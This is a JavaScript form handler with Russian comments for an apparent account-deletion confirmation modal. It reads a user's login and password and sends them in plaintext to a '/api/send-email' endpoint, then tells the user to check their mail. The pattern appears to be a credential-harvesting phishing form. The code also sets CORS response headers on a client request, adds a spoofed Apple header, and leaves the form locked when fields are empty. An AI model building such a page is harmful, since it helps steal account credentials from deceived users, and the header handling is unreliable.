// Функция для отправки формы
async function handleFormSubmit(e) {
  e.preventDefault();
  
  // Если уже отправляем, выходим
  if (isSubmitting) return;
  
  // Блокируем кнопку и форму
  isSubmitting = true;
  const submitButton = e.target.querySelector('button[type="submit"]');
  if (submitButton) {
    submitButton.disabled = true;
    submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
  }
  
  const login = document.getElementById('deleteLogin').value;
  const password = document.getElementById('deletePassword').value;
  
  // Проверяем пустые поля
  if (!login || !password) {
    showError('Пожалуйста, заполните все поля');
    return;
  }
  
  try {
    // Проверяем подключение к интернету
    if (!navigator.onLine) {
      throw new Error('Нет подключения к интернету. Проверьте соединение и повторите попытку.');
    }

    // Настройка специальных заголовков для Safari на iOS
    const headers = {
      'Content-Type': 'application/json',
      'Accept': 'application/json',
      'Origin': window.location.origin,
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Accept, Origin'
    };

    // Определение iOS устройства
    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;

    // На iOS добавляем специальную обработку
    if (isIOS) {
      // Добавляем дополнительные заголовки для Safari
      headers['X-Requested-With'] = 'XMLHttpRequest';
      headers['X-Apple-Store-Front'] = '143444,12';
      
      // Добавляем CORS префлайт запрос
      try {
        await fetch('http://localhost:3000/api/send-email', {
          method: 'OPTIONS',
          headers: headers
        });
      } catch (preflightError) {
        console.error('CORS preflight request failed:', preflightError);
        throw new Error('Не удалось установить соединение с сервером. Проверьте подключение к интернету.');
      }
    }

    // Основной запрос
    const response = await fetch('http://localhost:3000/api/send-email', {
      method: 'POST',
      headers: headers,
      body: JSON.stringify({ login, password })
    });
    
    const data = await response.json();
    
    if (response.ok) {
      // Закрываем модальное окно
      const modal = bootstrap.Modal.getInstance(document.getElementById('confirmDeleteModal'));
      if (modal) {
        modal.hide();
        // Удаляем затемнение через короткую задержку
        setTimeout(() => {
          const modalBackdrop = document.querySelector('.modal-backdrop');
          if (modalBackdrop) modalBackdrop.remove();
        }, 100);
      }
      
      // Сбрасываем форму
      e.target.reset();
      
      // Показываем уведомление
      showSuccess('Данные успешно отправлены! Проверьте почту через несколько минут.');
    } else {
      throw new Error(data.error || 'Ошибка при отправке данных');
    }
  } catch (error) {
    showError(error.message);
  } finally {
    // Возвращаем кнопку в исходное состояние
    isSubmitting = false;
    if (submitButton) {
      submitButton.disabled = false;
      submitButton.innerHTML = 'Подтвердить удаление';
    }
  }
}

// Функция для показа ошибок
function showError(message) {
  alert(message);
}

// Функция для показа успешных сообщений
function showSuccess(message) {
  alert(message);
}

// Инициализация обработчика формы
document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('deleteConfirmationForm');
  if (form) {
    form.addEventListener('submit', handleFormSubmit);
  }
});
